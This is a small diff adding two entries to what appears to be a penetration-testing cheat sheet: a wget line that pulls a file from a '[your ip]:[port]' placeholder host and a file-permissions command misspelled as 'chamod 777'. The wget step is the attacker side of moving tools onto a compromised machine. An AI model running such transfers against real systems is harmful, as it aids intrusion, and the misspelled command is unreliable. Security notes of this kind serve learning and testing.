@@ -107,6 +107,16 @@ uname -a
 systeminfo
 ```
 
+#### Wget (like curl) (get files from other ip address)
+```bash
+wget [your ip]:[port]/file
+```
+#### chamod
+
+```bash
+chamod 777 [file]
+```
+
 
 **THIS IS WORK IN PROGRESS**
 
